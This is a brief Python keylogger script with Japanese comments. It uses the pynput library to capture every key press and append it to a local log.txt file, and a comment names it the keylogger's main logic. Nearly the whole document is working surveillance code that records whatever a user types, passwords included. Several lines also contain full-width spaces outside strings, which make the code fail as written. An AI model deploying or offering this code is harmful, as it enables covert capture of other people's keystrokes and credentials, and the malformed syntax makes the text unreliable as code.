from pynput import keyboard #モジュールpynput

def on_press(key):#関数　キーロガーのメインロジック
    try:
        with open("log.txt", "a")　 as f: #ログをTextとして生成

            f.write(str(key.char)) #生のキー入力を文字列に変換
    except AttributeError: #異種のキー入力エラー
        with open("log.txt", "a") as f: #そのままログとして出力　fは一時的な変数
            f.write(str(key))　#生のキー入力を文字列として出力

with keyboard.Listener(on_press=on_press) as listener:　#動き続けるためのロジック
    listener.join()